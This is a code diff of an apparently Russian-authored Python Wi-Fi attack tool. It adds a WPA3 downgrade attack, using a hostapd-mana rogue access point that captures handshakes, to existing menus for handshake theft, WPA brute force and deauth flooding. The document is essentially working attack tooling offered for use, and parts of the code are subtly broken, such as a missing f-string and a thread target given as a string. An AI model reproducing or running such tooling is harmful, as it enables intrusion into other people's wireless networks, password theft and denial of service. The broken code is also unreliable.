@@ -2,7 +2,7 @@ import os
 import time
 import threading
 #===================================================================
-#АНАЛИЗ ФАЙЛА И АККУРАТНЫЙ ВЫВОД НА ЭКРАН(ВЫЗЫВАЕТСЯ ЧЕРЕЗ start())
+#      file analyst, clear screen output(called - scan())
 #===================================================================
 
 count = 0
@@ -126,7 +126,7 @@ def start():
     write()
 
 #==================================================================, 
-#              ГЛАВНОЕ МЕНЮ ПРОГРАММЫ И ЕЕ ВЫБОРНЫЕ ПАНЕЛИ        
+#              MAIN MENU AND MODULES
 #==================================================================
 
 
@@ -203,7 +203,8 @@ def choice_base():
 + 2) Перевод адаптера в режим мониторинга
 + 3) Брутфорс wpa/wpa2 handshake
 + 4) Выбор адаптера для работы
-+ 5) DDoS(Deauth атака)  
++ 5) DDoS(Deauth атака)
++ 6) Атака деградации(WPA3)
           \033[0m''')
 
 def choice_cycle():
@@ -281,12 +282,18 @@ def choice_cycle():
                 os.system('clear')
             elif choice == 5 and adapter_name != '':
                 deauth_attack()
+            if choice == 6 and adapter_name != '':
+                downgrade_attack()
+            if choice == 6 and adapter_name == '':
+                print('\033[33m[i] Выберите и переведите адаптер в режим мониторинга\033[0m')
+                choice_adapter()
+                os.system('clear')
         except(ValueError):
             os.system('clear')
 
 
 #================================================================
-#                   1) Сканирование сети и кража хэндшейка
+#                   1) Network scan and steal the handshake
 #================================================================
 def scanner():
     os.system(f'sudo xterm -e "airodump-ng -w networks --output-format csv -o {adapter_name}"')
@@ -303,7 +310,7 @@ def listen(key, filename, status, packages):
 
 
 #================================================================
-#                   2) Мониторинг мод
+#                   2) Monitor mode
 #================================================================
 
 def airmonng():
@@ -314,7 +321,7 @@ def airmonng():
     os.system(f'xterm -e "sudo airmon-ng start {adapter_name}"')
     adapter_mode = "Monitor"
 #================================================================
-#                   3) Брутфорс
+#                   3) Bruteforce
 #================================================================
 
 def bruteforce():
@@ -336,7 +343,7 @@ def bruteforce():
                    file_name_mass.append(i)
                 if i == '/':
                   break
-            file_name_str = ''   #Готовое имя файла с хэндшейком
+            file_name_str = ''   #Ready file name with handshake
             for i in file_name_mass:
                 file_name_str += i
             file_name_str_rev = file_name_str[::-1]
@@ -358,7 +365,7 @@ def bruteforce():
                 print("\033[31m[i] Ошибка открытия файла\033[0m")
                 trash_variable = input('\033[33mНажмите для продолжения...\033[0m')
 #================================================================
-#                   4) Выбор адаптера для работы
+#                   4) Choice adapter for work
 #================================================================
 adapter_name = ''
 def choice_adapter():
@@ -367,7 +374,7 @@ def choice_adapter():
     adapter_name = input()
 
 #================================================================
-#                   5) Deauth атака
+#                   5) Deauth attack
 #================================================================
 def deauth_attack():
     scanner()
@@ -383,5 +390,53 @@ def deauth_attack():
         print('\033[33m[i] Введите число\033[0m')
         time.sleep(1)
         os.system('clear')
+#================================================================
+#                  6) Downgrade attack
+#================================================================
+def downgrade_attack():
+    os.system('clear')
+    start_windowa()
+    def downgrade_attack_start():
+        os.system('sudo xterm -e "hostapd-mana hostapd-mana.conf"')
+    ssid = input('\033[33mУкажите имя сети: \033[0m')
+    try:
+        channel = int(input('\033[33mУкажите канал: \033[0m'))
+    except ValueError:
+        return
+    handname = input('\033[33mУкажите название хэндшейка: \033[0m')
+    deauth = input('\033[33mПровести deauth атаку? Y\\N: \033[0m')
+    deauthh = 0
+    if deauth == 'y' or deauth == 'Y':
+        os.system('xterm -e "iw dev {adapter_name} set channel {channel}"')
+        deauthh = 1
+    else:
+        pass
+    start = input('\033[33mНачать атаку?(Y/N): \033[0m')
+    if start == 'y' or start == 'Y':
+        with open ('hostapd-mana.conf', 'a') as file:
+            file.write(f'''interface={adapter_name}
+driver=nl80211
+ssid={ssid}
+channel={channel}
+hw_mode=g
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+rsn_pairwise=CCMP
+wpa_passphrase=basicpass
+mana_wpaout=handshake.hccapx''')
+        if deauthh == 1:
+            bssid = input('\033[33mУкажите bssid сети: \033[0m')
+            packets = input('\033[33mУкажите количество пакетов(По умолчанию 20): \033[0m')
+            if packets == '':
+                packets == 20
+            threading.Thread(target="downgrade_attack_start()").start()
+            os.system(f'sudo xterm -e "aireplay-ng --deauth {packets} -a {bssid} {adapter_name}"')
+        elif deauthh == 0:
+            downgrade_attack_start()
+            os.system('sudo rm -f hostapd-mana.conf')
+            print('\033[33m[i]Файл создан в текущей директории\033[0m')
+            trash_value = input('\033[33mНажмите для продолжения...\033[0m')
+
 os.system('clear')
 choice_cycle()
